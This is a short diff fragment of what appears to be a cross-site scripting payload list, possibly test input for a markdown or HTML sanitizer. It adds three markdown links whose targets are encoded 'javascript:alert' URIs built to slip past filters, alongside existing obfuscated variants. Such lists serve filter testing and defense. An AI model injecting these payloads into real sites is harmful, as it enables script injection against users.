@@ -159,3 +159,9 @@ javas\x09cript:javascript:alert(1)>
 <jav&#97ascript:javascript:alert(1)>
 
 <jAvAsCrIpT:alert(1)>
+
+[XSS](javascript:alert%28&#039;XSS&#039;%29)
+
+[XSS](javascript&colon;alert%28&#039;XSS&#039;%29)
+
+[XSS](javascript&amp;colon;alert%28&#039;XSS&#039;%29)
